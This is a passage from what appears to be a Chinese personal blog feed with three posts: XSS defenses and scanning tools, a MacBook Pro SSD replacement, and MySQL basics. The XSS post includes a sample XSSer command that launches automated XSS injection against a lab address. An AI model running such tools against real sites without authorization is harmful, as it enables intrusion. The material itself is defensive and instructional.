如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。</p><p><strong>1;mode=block</strong></p><p>启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。</p><p><strong>1; report=&lt;reporting-URI&gt;  (Chromium only)</strong></p><p>启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP report-uri指令的功能发送违规报告。</p></blockquote><p>x-xss-protection头很容易实现，只需要轻微的Web服务器配置的变化。</p><p><strong>在Nginx中启用</strong></p><pre><code class="nginx">add_header x-xss-protection &quot;1; mode=block&quot; always;</code></pre><p><strong>在Apache中启用</strong></p><pre><code class="php">header always set x-xss-protection &quot;1; mode=block&quot;</code></pre><p><strong>在IIS上启用</strong></p><p>要在IIS上启用，只需以下代码添加到您网站的Web.config文件中即可。</p><pre><code class="php">&lt;system.webServer&gt;    ...    &lt;httpProtocol&gt;        &lt;customHeaders&gt;            &lt;add name=&quot;X-XSS-Protection&quot; value=&quot;1; mode=block&quot; /&gt;        &lt;/customHeaders&gt;    &lt;/httpProtocol&gt;    ...&lt;/system.webServer&gt;</code></pre><p>在进行配置之后，还需要检查以确保x-xss-protection头确实已经被启用。以下是一些快速检查的简单方法：</p><ol><li> 打开Chrome DevTools中的网络选项卡，如果您的站点使用安全标头，它将显示在标题选项卡内。</li></ol><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6boj2y6bqj31aw0gkth3.jpg" alt="image-20190825094437775"></p><center>Figure 5 确保x-xss-protection头已开启</center>2.检查安全标头的另一种快速方法是使用的工具[securityheaders.io](https://securityheaders.io/)快速扫描网站。这会根据你的所有安全标头来提供等级，可以看到缺少的内容。<h2 id="防御方法五-XSS防火墙"><a href="#防御方法五-XSS防火墙" class="headerlink" title="防御方法五 XSS防火墙"></a>防御方法五 XSS防火墙</h2><p>这种技术目前正处于概念阶段,并没有大范围投入使用,其思路是用js代码来对当前网页进行防护,防止发生XSS行为。而且设计理念也是各有不同。</p><h2 id="解决方案优劣综合对比"><a href="#解决方案优劣综合对比" class="headerlink" title="解决方案优劣综合对比"></a>解决方案优劣综合对比</h2><table><thead><tr><th align="center"><strong>解决方案</strong></th><th align="center"><strong>优点</strong></th><th align="center"><strong>缺点</strong></th></tr></thead><tbody><tr><td align="center">前端输入检查</td><td align="center">对innerHTML的内容进行检查，对eval中用户输入的参数进行检查，对于使用的JS库（如jquery）以及Flash进行检查，以免使用了存在XSS漏洞的JS库和swf文件。可以减轻服务器压力。</td><td align="center">仅对DOM型XSS有效，对于其他类型的XSS，可以通过抓包工具绕过。</td></tr><tr><td align="center">服务器端处理</td><td align="center">服务器端转义输入的左右尖括号、单双引号等符号，对HTML标签进行编码，这是主流的防御XSS的方法，可有效防御一般的XSS攻击。</td><td align="center">无法防御部分DomXSS攻击，以及Flash XSS攻击。</td></tr><tr><td align="center">CSP</td><td align="center">规范了网页中某个标签所能加载的第三方域，从协议层把一些存在安全隐患的用法默认给去除掉，将同源同域发挥到极致，结合禁止内联脚本的机制，可以有效防御大部分的XSS攻击。</td><td align="center">需要在服务器端进行配置，而且一旦配置不当，正常的业务也会受到影响。配置不严格又会导致绕过。对于大型的、复杂的网站业务，维护成本较高。</td></tr><tr><td align="center">X-XSS-Protection</td><td align="center">依赖于浏览器的XSS筛选器，仅对部分XSS payload有效</td><td align="center">对网站业务有一定程度的影响。</td></tr><tr><td align="center">HttpOnly</td><td align="center">在服务器端做配置,在响应头里对cookie中的session进行httponly标记,被标记的session无法被js读出,因此可以有效防御针对偷取cookie的XSS攻击。</td><td align="center">只能防御针对cookie的XSS攻击。</td></tr><tr><td align="center">XSS防火墙</td><td align="center">利用前端的JS组件，对网页中的事件进行监控，拦截恶意脚本的运行，进而防止发生XSS行为</td><td align="center">若前端的JS代码暴露，容易造成绕过</td></tr></tbody></table><h1 id="XSS相关工具介绍"><a href="#XSS相关工具介绍" class="headerlink" title="XSS相关工具介绍"></a>XSS相关工具介绍</h1><h2 id="工具一-XSSer"><a href="#工具一-XSSer" class="headerlink" title="工具一 XSSer"></a>工具一 XSSer</h2><p>XSSer是一种自动框架，用于检测，利用和报告基于Web的应用程序中的XSS漏洞。它包含几个试图绕过某些过滤器的选项，以及各种特殊的代码注入技术。</p><p>下图是OWASP中所列XSSer的运作流程：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bomjsj42j314p0u0thz.jpg" alt="image-20190825094756457"></p><p>XSSer可在许多平台上运行。它需要Python和以下库：</p><pre><code class="python">- python-pycurl - Python bindings to libcurl- python-xmlbuilder - create xml/(x)html files - Python 2.x- python-beautifulsoup - error-tolerant HTML parser for Python- python-geoip - Python bindings for the GeoIP IP-to-country resolver library</code></pre><p>若在基于Debian的系统上安装需要：</p><pre><code>sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip</code></pre><p>利用”xsser -h”可以列出所有功能XSSer包：</p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6booea5q7j30jc0cv3zo.jpg" alt="img"></p><p>若要发起简单的XSS注入攻击可用：</p><pre><code>root @ kali ：〜＃xsser -u“http://192.168.169.130/xss/example1.php?name=hacker”</code></pre><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bopcyo2ij30jc0g3ta7.jpg" alt="img"></p><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g6bopzvbulj30jc0g375l.jpg" alt="img"></p><p>XSSer的主要特点是：</p><ul><li><p>  使用GET和POST方法注入。</p></li><li><p>  包括各种过滤器和旁路技术。</p></li><li><p>  可以与命令行和GUI一起使用。</p></li><li><p>  将提供详细的攻击统计数据。</p></li></ul><p><strong>5.2 工具二 XSSfork（</strong><a href="https://paper.seebug.org/359/">[https://paper.seebug.org/359/]{.underline}</a><strong>）//5月7日</strong></p><p>xssfork 作为 sicklescan 的一个功能模块，其开发主要目的是用于检测 xss 漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 个人总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MBP839更换ssd过程记录</title>
      <link href="2019/08/15/macbook%E6%8D%A2%E7%A1%AC%E7%9B%98/"/>
      <url>2019/08/15/macbook%E6%8D%A2%E7%A1%AC%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h1><p>我的笔记本购于2015刚上大学时，受限于手中米不够，只能选择丐版128g的MF839CH/A。四年持续的使用，除了容量逐渐捉襟见肘，速度并没有明显的下降且运行十分稳定，本次鸟枪换炮希望能再撑4年，主要原因有以下几点：</p><ul><li>穷，前几天与朋友的一次长途旅行花掉了口袋中艰难存下的米（主因最先提出）</li><li>15款MBP更换案例教程网上极多，使用M.2转接卡的方案基本成熟</li><li>仅从学习角度讲性能足够，我也没玩电脑游戏的需求</li></ul><a id="more"></a><h1 id="更换原理"><a href="#更换原理" class="headerlink" title="更换原理"></a>更换原理</h1><p>在 <code>macOS</code>  10.13 正式发布之后，支持原生 <code>NVME</code> 协议，因此更换上相应的固态硬盘成为可能。<br> 目前所知 2015 款及之前的 MacBook Pro 中 128 GB 和 256 GB 版本的原装硬盘都不是NVME协议，而是比较常规的 SATA。这么一来更换它就有了原始的动机：<code>更换后速度能比原装更快！成本更低！</code></p><p>由于 Apple 自家产品的封闭性，市面上通用的 m.2 接口固态硬盘都需要连接转接头才能够在 MacBook 上使用。因此需要在淘宝上自行搜索 <strong>“M.2 NGFF 转 MacBook”</strong> 关键字来找到这个转接头。</p><h1 id="替换SSD的选择"><a href="#替换SSD的选择" class="headerlink" title="替换SSD的选择"></a>替换SSD的选择</h1><p>要注意一个点，替换后在MacBook pro 2015 上并不能跑满速这类高端硬盘，原因是15 年 13 款包括老一点的 13 年 Mac Pro，速度基本上是 PCIe 2.0 x4，即 5 GT/s ；在 15 年 15 寸上是 3.0 x4，也就是 8 GT/s。这是上限，但尽量还是选择好点的硬盘毕竟缓存大一点，主控也好一点不那么容易出现掉速的情况。</p><p>通过对国内外各种论坛中相关案例的总结，出现频率比较高的几款总结如下：</p><ul><li>三星：960pro、960evo（唤醒可能有问题）、970pro、970evo<font color=red><strong><em>//这里需要提醒，我询问转接卡卖家小二，三星evo plus系列转接后与mac不兼容</em></strong></font> </li><li>西数：SN720、SN750（部分反映温度较高）</li><li>惠普：EX900（入门级NVMe）、920<font color=red><strong><em>//惠普的价格一直挺低，但似乎有“李鬼”的嫌疑，惠普中国与惠普硬盘之间的关系傻傻搞不清，反正我在HP官网是没有查到这几款硬盘的数据</em></strong></font> </li><li>英特尔：660p、760p<font color=red><strong><em>//660p采用qlc闪存，写入寿命较短，在写入大文件时后期掉速现象比较严重；而760p采用tlc闪存，写入寿命相对较长，温度控制是最大优势，正常30度</em></strong></font> </li><li>国产ssd：海康威视C2000等<font color=red><strong><em>//性价比高，但是试水的人不多，不知道后期的兼容性如何</em></strong></font> </li></ul><h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>需要准备的工具如下：</p><ol><li>一个安装mac系统的u盘（新的ssd是无法识别的，必须要用u盘引导安装）</li><li>time machine备份当前系统用于恢复在新的ssd上</li><li>内六角T4和内五角P5的螺丝刀，我买的米家的wiha工具，89块</li><li>一块新的m.2接口的ssd，我选择的是intel 760p </li><li>一个m.2 nvme的转接器</li></ol><h1 id="更换的具体过程"><a href="#更换的具体过程" class="headerlink" title="更换的具体过程"></a>更换的具体过程</h1><h2 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h2><p>time machine是<code>macOS</code>自带的备份软件，在<code>launchpad</code>里面的<code>other</code>文件夹中可以找到，你需要一块移动硬盘，把当前系统的所有文件都写进去，需要注意的是移动硬盘会被格式化，如果你的移动硬盘里面有什么重要的文件，备份到其他地方。备份还是比较简单的，使用MacBook自带的时间机器直接备份到外置硬盘上即可；<br>详情查看这里：<a href="https://support.apple.com/zh-cn/HT201250">Apple —- 使用“时间机器”备份您的 Mac</a></p><h2 id="制作启动优盘"><a href="#制作启动优盘" class="headerlink" title="制作启动优盘"></a>制作启动优盘</h2><p>我安装的是最新的<code>macOS Mojave</code>系统，在app store中搜索下载，下载完成后不要选择安装，此时你的<code>Applications</code>文件夹中会有一个<code>Install macOS Mojave.app</code>的文件，大小差不多6G出头，然后根据mac官方的<a href="https://support.apple.com/zh-cn/HT201372">网页</a>在<code>terminal</code>输入命令就可以了。</p><p>准备一个大于8G的U盘，制作U盘启动器，有两种方法，第一种是命令行解决，第二种是傻瓜软件，教程直接看链接：<br><a href="https://www.iplaysoft.com/macos-usb-install-drive.html">制作 macOS Mojave U盘USB启动安装盘方法教程 (全新安装 Mac 系统)</a></p><p>主要使用命令为</p><pre><code>sudo /Applications/Install\ macOS\ Mojave.app/Contents/Resources/createinstallmedia --volume /Volumes/Mojave /Applications/Install\ macOS\ Mojave.app --nointeraction</code></pre><h2 id="开始更换"><a href="#开始更换" class="headerlink" title="开始更换"></a>开始更换</h2><h3 id="将准备好的东西放在一起"><a href="#将准备好的东西放在一起" class="headerlink" title="将准备好的东西放在一起"></a>将准备好的东西放在一起</h3><p>清点一下东西，不要少了材料工具</p><p><img src="http://ww2.sinaimg.cn/large/006y8mN6ly1g67dnvmctcj31sm0u0kjl.jpg" alt="5605774FA554D16BA3DF66D25330D0F8"></p><h3 id="打开后盖、断开电源、安装"><a href="#打开后盖、断开电源、安装" class="headerlink" title="打开后盖、断开电源、安装"></a>打开后盖、断开电源、安装</h3><p>可以参考iFitit的拆解教程：<a href="https://zh.ifixit.com/Guide/MacBook+Pro+13+%E8%8B%B1%E5%AF%B8%E9%85%8D%E5%A4%87+Retina+%E6%98%BE%E7%A4%BA%E5%B1%8F2015%E5%B9%B4%E6%97%A9%E6%9C%9F%E7%89%88SSD%E6%9B%B4%E6%8D%A2/38520">https://zh.ifixit.com/Guide/MacBook+Pro+13+英寸配备+Retina+显示屏2015年早期版SSD更换/38520</a></p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67dpempegj31sm0u0hdu.jpg" alt="C1810F5FA658A13131BF55F9F3B2A4E1"></p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67dpmzdpfj30u01sme82.jpg" alt="A230D7D0994D4E09B1340C8C64A00841"></p><p><img src="http://ww2.sinaimg.cn/large/006y8mN6ly1g67e3jradrj30u01smkjm.jpg" alt="86A2E2B603E766EAAC0A687D0D21BC90"></p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e3gbee4j30u01smu0x.jpg" alt="D67C2E0107897E1C79408A370D552133"></p><ol><li>背板上一共10个螺丝，靠近显示器的一边4个，中间两个，最下面4个，其中靠近显示器那边的4个的中间两个是和其他螺丝不同的比较短的，安装的时候记得区分。</li><li>螺丝拆外以后从靠近显示器的那边揭开背板，是比较容易的，只要抓着靠着显示器那边的背板沿，稍稍用力就可以揭开（背板除了螺丝，就只有中间的两个卡扣固定，不是很紧，很容易揭开）</li><li>换ssd为了安全起见不要带电操作，把电源先断开，在ifixit的那个页面也有看到，第一次拔那个电源可能有点紧，可以先在一边用力，会比较好拔一点，力气要稍微大一点。</li><li>转接器的插入不是那么容易，要用点力，转接器和ssd一定要插好，不然螺丝不好上（固定ssd的就一个内五角螺丝）</li><li>安装完成以后记得把电源线插回去</li></ol><h3 id="安装系统以及恢复"><a href="#安装系统以及恢复" class="headerlink" title="安装系统以及恢复"></a>安装系统以及恢复</h3><p>由于新装的ssd系统是无法识别的，我们需要一个u盘安装器来引导安装并格式化新的ssd，插上u盘，启动电脑（第一次启动可能比较慢，不要着急）。系统会直接读取U盘开始安装，在安装系统之前，先进入磁盘工具格式化自己的新ssd。格式化的格式选择按apple官方的说法是<code>macOS 日志</code>和<code>afps</code>都可以，我原来的ssd是<code>afps</code>的，不过也有说要设置一下<code>GUID分区图</code>的，所以我的做法是先格式化了一边<code>macOS日志</code>，在格式化成<code>afps</code>格式。</p><p>格式化好ssd以后此时ssd已经能被系统识别的，我们退出磁盘工具，选择安装macOS，安装的位置就选择我们的新ssd，安装过程很快我感觉没10分钟就安装好了。安装好系统以后就会进入到系统设置阶段（选择地区，键盘以及隐私政策），前面的直接下一步就行了，直到要你选择<code>是否要传输信息到这台mac</code>，接上你的备份硬盘，选择第一个从时间机器传输，然后选择最新的备份就可以了，恢复系统的时间比较长，我的系统文件就60多个G也恢复了一个小时，如果你的文件更多可能要更久。</p><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e3gptlij31sm0u01kx.jpg" alt="FF2D262D0815359B756F0FE3D14C2201"></p><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e3ibtkpj31sm0u01kx.jpg" alt="CE0783F9E75DB613BA2FDAA8DF940F97"></p><h2 id="硬盘测试"><a href="#硬盘测试" class="headerlink" title="硬盘测试"></a>硬盘测试</h2><ol><li>原装的128G固态是SATA协议的，这个512G是NVME协议的性能更强；</li><li>链接宽度必须是x4的只要你的硬盘是支持pcie x4的就可以，如果不是，转接卡有问题，尽快更换；</li><li>链接速度13寸的是5.0的，15寸的是8.0的，如果不是，也是转接卡的问题；</li></ol><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e3j5i2yj315m0run2a.jpg" alt="image-20190815133916201"></p><p>最后上一张跑速的图，基本正常（在测试数据设置中，要改为1Gb为准，默认5Gb在后面会掉速，是正常现象）</p><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e3huvyej30kc0l0tc5.jpg" alt="DiskSpeedTest"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>2015款是最后几代能自己换硬盘的macbook了，真的很难得，之后都是焊在主板上，再加上从上一代Macos还开放了对NVME的支持，摆了明让人换硬盘，有老款mac的小伙伴们赶快行动起来吧！</p>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MacbookPro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>认识sql并学习数据库的基础操作</title>
      <link href="2019/08/09/%E8%AE%A4%E8%AF%86sql%E5%B9%B6%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/"/>
      <url>2019/08/09/%E8%AE%A4%E8%AF%86sql%E5%B9%B6%E5%AD%A6%E4%B9%A0%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="关系型数据库与非关系型数据库的区别"><a href="#关系型数据库与非关系型数据库的区别" class="headerlink" title="关系型数据库与非关系型数据库的区别"></a>关系型数据库与非关系型数据库的区别</h1><p><strong>数据库</strong>，简而言之可视为电子化的文件柜——存储电子文件的处所，用户可以对文件中的数据运行新增、截取、更新、删除等操作。</p><p>所谓“数据库”系以<strong>一定方式</strong>储存在一起、能予多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。一个数据库由多个表空间（Tablespace）构成。</p><a id="more"></a><h2 id="关系型数据库"><a href="#关系型数据库" class="headerlink" title="关系型数据库"></a>关系型数据库</h2><p><img src="http://ww1.sinaimg.cn/large/006y8mN6ly1g67e4anfl6j30ae05bt8x.jpg" alt="image-20190809213135889"></p><p>关系型数据库最典型的数据结构是表，由二维表及其之间的联系所组成的一个数据组织</p><p><strong>优点：</strong></p><p>1、易于维护：都是使用表结构，格式一致；<br>2、使用方便：SQL语言通用，可用于复杂查询；<br>3、复杂操作：支持SQL，可用于一个表以及多个表之间非常复杂的查询。</p><p><strong>缺点：</strong></p><p>1、读写性能比较差，尤其是海量数据的高效率读写；                                                                                                    2、固定的表结构，灵活度稍欠；                                                                        3、高并发读写需求，传统关系型数据库来说，硬盘I/O是一个很大的瓶颈。</p><h2 id="非关系型数据库"><a href="#非关系型数据库" class="headerlink" title="非关系型数据库"></a>非关系型数据库</h2><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e4d0wlmj30a105474m.jpg" alt="image-20190809213436309"></p><p>非关系型数据库严格上不是一种数据库，应该是一种数据结构化存储方法的集合，可以是文档或者键值对等。</p><p><strong>优点：</strong></p><p>1、格式灵活：存储数据的格式可以是key,value形式、文档形式、图片形式等等，文档形式、图片形式等等，使用灵活，应用场景广泛，而关系型数据库则只支持基础类型。<br>2、速度快：nosql可以使用硬盘或者随机存储器作为载体，而关系型数据库只能使用硬盘；<br>3、高扩展性；<br>4、成本低：nosql数据库部署简单，基本都是开源软件。</p><p><strong>缺点：</strong></p><p>1、不提供sql支持，学习和使用成本较高；<br>2、无事务处理；                                                                                                            3、数据结构相对复杂，复杂查询方面稍欠。</p><h1 id="学习关系型数据库——MySQL"><a href="#学习关系型数据库——MySQL" class="headerlink" title="学习关系型数据库——MySQL"></a>学习关系型数据库——MySQL</h1><p>MySQL 是一个关系型数据库管理系统，由瑞典 MySQL AB 公司开发，目前属于 Oracle 公司。MySQL 是一种关联数据库管理系统，关联数据库将数据保存在不同的表中，而不是将所有数据放在一个大仓库内，这样就增加了速度并提高了灵活性。</p><ul><li>MySQL 是开源的，所以你不需要支付额外的费用。</li><li>MySQL 支持大型的数据库。可以处理拥有上千万条记录的大型数据库。</li><li>MySQL 使用标准的 SQL 数据语言形式。</li><li>MySQL 可以运行于多个系统上，并且支持多种语言。这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等。</li><li>MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言。</li><li>MySQL 支持大型数据库，支持 5000 万条记录的数据仓库，32 位系统表文件最大可支持 4GB，64 位系统支持最大的表文件为8TB。</li><li>MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统</li></ul><p>上一周的任务中，我在Docker容器中已经成功安装了Mysql，这里我在终端先进入容器中的mysql</p><pre><code>docker exec -it mymysql bash   //mymysql是我的sql容器名字mysql -uroot -p</code></pre><p><img src="http://ww2.sinaimg.cn/large/006y8mN6ly1g67e4aelscj31hc0kkgsj.jpg" alt="image-20190809214931461"></p><p>此时己成功进入sql容器中</p><h2 id="创建一个数据库"><a href="#创建一个数据库" class="headerlink" title="创建一个数据库"></a>创建一个数据库</h2><p>我们可以在登陆 MySQL 服务后，使用 <strong>create</strong> 命令创建数据库，语法如下:</p><pre><code>CREATE DATABASE 数据库名;</code></pre><p>这里我们创建一个test1的数据库进行进一步操作，随后我们通过</p><pre><code>show databases；</code></pre><p>发现创建成功</p><p><img src="http://ww1.sinaimg.cn/large/006y8mN6ly1g67e48vbzyj30qo06xt9b.jpg" alt="image-20190809215629066"></p><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><p>创建MySQL数据表需要以下信息：</p><ul><li>表名</li><li>表字段名</li><li>定义每个表字段</li></ul><p>以下为创建MySQL数据表的SQL通用语法：</p><pre><code>CREATE TABLE table_name (column_name column_type);</code></pre><p>首先我们选择test1数据库，在其中创建一张Fstark表</p><pre><code>use test1;</code></pre><pre><code>CREATE TABLE Fstark(   fstark_id INT UNSIGNED AUTO_INCREMENT,   fstark_title VARCHAR(100) NOT NULL,   fstark_author VARCHAR(40) NOT NULL,   submission_date DATE,   PRIMARY KEY ( fstark_id ))ENGINE=InnoDB DEFAULT CHARSET=utf8;</code></pre><p>实例解析：</p><ul><li><p>如果你不想字段为 <strong>NULL</strong> 可以设置字段的属性为 <strong>NOT NULL</strong>， 在操作数据库时如果输入该字段的数据为<strong>NULL</strong> ，就会报错。</p></li><li><p>AUTO_INCREMENT定义列为自增的属性，一般用于主键，数值会自动加1。</p></li><li><p>PRIMARY KEY关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔。</p></li><li><p>ENGINE 设置存储引擎，CHARSET 设置编码。</p><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e4b91z8j30a606xmxp.jpg" alt="image-20190809220838586"></p><p>通过<code>show tables；</code>命令发现创建成功。</p><h2 id="在表内添加数据"><a href="#在表内添加数据" class="headerlink" title="在表内添加数据"></a>在表内添加数据</h2><p>MySQL 表中使用 <strong>INSERT INTO</strong> SQL语句来插入数据。可以通过 mysql&gt; 命令提示窗口中向数据表中插入数据</p><pre><code>INSERT INTO Fstark     (fstark_title, fstark_author, submission_date)    VALUES    (&quot;test1234&quot;, &quot;Fstark&quot;, NOW());</code></pre></li></ul><p><img src="http://ww4.sinaimg.cn/large/006y8mN6ly1g67e4brmxvj30q80egmzl.jpg" alt="image-20190809222929413"></p><h2 id="where查询语句"><a href="#where查询语句" class="headerlink" title="where查询语句"></a>where查询语句</h2><p>​    以下是 SQL SELECT 语句使用 WHERE 子句从数据表中读取数据的通用语法：</p><pre><code>SELECT field1, field2,...fieldN FROM table_name1, table_name2...[WHERE condition1 [AND [OR]] condition2.....</code></pre><ul><li><p>查询语句中你可以使用一个或者多个表，表之间使用逗号**,** 分割，并使用WHERE语句来设定查询条件。</p></li><li><p>你可以在 WHERE 子句中指定任何条件。</p></li><li><p>你可以使用 AND 或者 OR 指定一个或多个条件。</p></li><li><p>WHERE 子句也可以运用于 SQL 的 DELETE 或者 UPDATE 命令。</p></li><li><p>WHERE 子句类似于程序语言中的 if 条件，根据 MySQL 表中的字段值来读取指定的数据。</p><p>我来查找刚刚创建的表中，author为Fstark的数据，看是否可以查找成功</p><pre><code>SELECT * from Fstark WHERE fstark_author=&#39;fstark&#39;;</code></pre></li></ul><p><img src="http://ww3.sinaimg.cn/large/006y8mN6ly1g67e4clkioj30q807s3zz.jpg" alt="image-20190809223431842"></p><p>这里已经查询成功，细心的可能已经发现，我这里where查询语句对于大小写是不敏感的，可以使用 BINARY                     关键字来设定 WHERE 子句的字符串比较是区分大小写的，比如：</p><pre><code>SELECT * from Fstark WHERE BINARY fstark_author=&#39;fstark&#39;;</code></pre><p>就没有结果，但是若换成：</p><pre><code>SELECT * from Fstark WHERE BINARY fstark_author=&#39;Fstark&#39;;</code></pre><p>既查询成功。</p><p><img src="http://ww2.sinaimg.cn/large/006y8mN6ly1g67e49d8r8j30q808qgnb.jpg" alt="image-20190809223726840"></p><h2 id="删除表单"><a href="#删除表单" class="headerlink" title="删除表单"></a>删除表单</h2><p>​    以下为删除MySQL数据表的通用语法：</p><pre><code>DROP TABLE table_name ;</code></pre><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><p>​    在删除数据库过程中，务必要十分谨慎，因为在执行删除命令后，所有数据将会消失。</p><p>​    drop 命令格式：</p><pre><code>drop database &lt;数据库名&gt;;</code></pre><h1 id="MySQL数据类型"><a href="#MySQL数据类型" class="headerlink" title="MySQL数据类型"></a>MySQL数据类型</h1><p>​    MySQL中定义数据字段的类型对你数据库的优化是非常重要的。</p><p>MySQL支持多种类型，大致可以分为三类：数值、日期/时间和字符串(字符)类型。</p><h2 id="数值类型"><a href="#数值类型" class="headerlink" title="数值类型"></a>数值类型</h2><p>MySQL支持所有标准SQL数值数据类型。</p><p>这些类型包括严格数值数据类型(INTEGER、SMALLINT、DECIMAL和NUMERIC)，以及近似数值数据类型(FLOAT、REAL和DOUBLE PRECISION)。</p><p>关键字INT是INTEGER的同义词，关键字DEC是DECIMAL的同义词。</p><p>BIT数据类型保存位字段值，并且支持MyISAM、MEMORY、InnoDB和BDB表。</p><p>作为SQL标准的扩展，MySQL也支持整数类型TINYINT、MEDIUMINT和BIGINT。下面的表显示了需要的每个整数类型的存储和范围。</p><table><thead><tr><th>类型</th><th>大小</th><th>范围（有符号）</th><th>范围（无符号）</th><th>用途</th></tr></thead><tbody><tr><td>TINYINT</td><td>1 字节</td><td>(-128，127)</td><td>(0，255)</td><td>小整数值</td></tr><tr><td>SMALLINT</td><td>2 字节</td><td>(-32 768，32 767)</td><td>(0，65 535)</td><td>大整数值</td></tr><tr><td>MEDIUMINT</td><td>3 字节</td><td>(-8 388 608，8 388 607)</td><td>(0，16 777 215)</td><td>大整数值</td></tr><tr><td>INT或INTEGER</td><td>4 字节</td><td>(-2 147 483 648，2 147 483 647)</td><td>(0，4 294 967 295)</td><td>大整数值</td></tr><tr><td>BIGINT</td><td>8 字节</td><td>(-9,223,372,036,854,775,808，9 223 372 036 854 775 807)</td><td>(0，18 446 744 073 709 551 615)</td><td>极大整数值</td></tr><tr><td>FLOAT</td><td>4 字节</td><td>(-3.402 823 466 E+38，-1.175 494 351 E-38)，0，(1.175 494 351 E-38，3.402 823 466 351 E+38)</td><td>0，(1.175 494 351 E-38，3.402 823 466 E+38)</td><td>单精度 浮点数值</td></tr><tr><td>DOUBLE</td><td>8 字节</td><td>(-1.797 693 134 862 315 7 E+308，-2.225 073 858 507 201 4 E-308)，0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td>0，(2.225 073 858 507 201 4 E-308，1.797 693 134 862 315 7 E+308)</td><td>双精度 浮点数值</td></tr><tr><td>DECIMAL</td><td>对DECIMAL(M,D) ，如果M&gt;D，为M+2否则为D+2</td><td>依赖于M和D的值</td><td>依赖于M和D的值</td><td>小数值</td></tr></tbody></table><h2 id="日期和时间类型"><a href="#日期和时间类型" class="headerlink" title="日期和时间类型"></a>日期和时间类型</h2><p>表示时间值的日期和时间类型为DATETIME、DATE、TIMESTAMP、TIME和YEAR。</p><p>每个时间类型有一个有效值范围和一个”零”值，当指定不合法的MySQL不能表示的值时使用”零”值。</p><p>TIMESTAMP类型有专有的自动更新特性，将在后面描述。</p><table><thead><tr><th>类型</th><th>大小 (字节)</th><th>范围</th><th>格式</th><th>用途</th></tr></thead><tbody><tr><td>DATE</td><td>3</td><td>1000-01-01/9999-12-31</td><td>YYYY-MM-DD</td><td>日期值</td></tr><tr><td>TIME</td><td>3</td><td>‘-838:59:59’/‘838:59:59’</td><td>HH:MM:SS</td><td>时间值或持续时间</td></tr><tr><td>YEAR</td><td>1</td><td>1901/2155</td><td>YYYY</td><td>年份值</td></tr><tr><td>DATETIME</td><td>8</td><td>1000-01-01 00:00:00/9999-12-31 23:59:59</td><td>YYYY-MM-DD HH:MM:SS</td><td>混合日期和时间值</td></tr><tr><td>TIMESTAMP</td><td>4</td><td>1970-01-01 00:00:00/2038结束时间是第 <strong>2147483647</strong> 秒，北京时间 <strong>2038-1-19 11:14:07</strong>，格林尼治时间 2038年1月19日 凌晨 03:14:07</td><td>YYYYMMDD HHMMSS</td><td>混合日期和时间值，时间戳</td></tr></tbody></table><h2 id="字符串类型"><a href="#字符串类型" class="headerlink" title="字符串类型"></a>字符串类型</h2><p>字符串类型指CHAR、VARCHAR、BINARY、VARBINARY、BLOB、TEXT、ENUM和SET。该节描述了这些类型如何工作以及如何在查询中使用这些类型。</p><table><thead><tr><th>类型</th><th>大小</th><th>用途</th></tr></thead><tbody><tr><td>CHAR</td><td>0-255字节</td><td>定长字符串</td></tr><tr><td>VARCHAR</td><td>0-65535 字节</td><td>变长字符串</td></tr><tr><td>TINYBLOB</td><td>0-255字节</td><td>不超过 255 个字符的二进制字符串</td></tr><tr><td>TINYTEXT</td><td>0-255字节</td><td>短文本字符串</td></tr><tr><td>BLOB</td><td>0-65 535字节</td><td>二进制形式的长文本数据</td></tr><tr><td>TEXT</td><td>0-65 535字节</td><td>长文本数据</td></tr><tr><td>MEDIUMBLOB</td><td>0-16 777 215字节</td><td>二进制形式的中等长度文本数据</td></tr><tr><td>MEDIUMTEXT</td><td>0-16 777 215字节</td><td>中等长度文本数据</td></tr><tr><td>LONGBLOB</td><td>0-4 294 967 295字节</td><td>二进制形式的极大文本数据</td></tr><tr><td>LONGTEXT</td><td>0-4 294 967 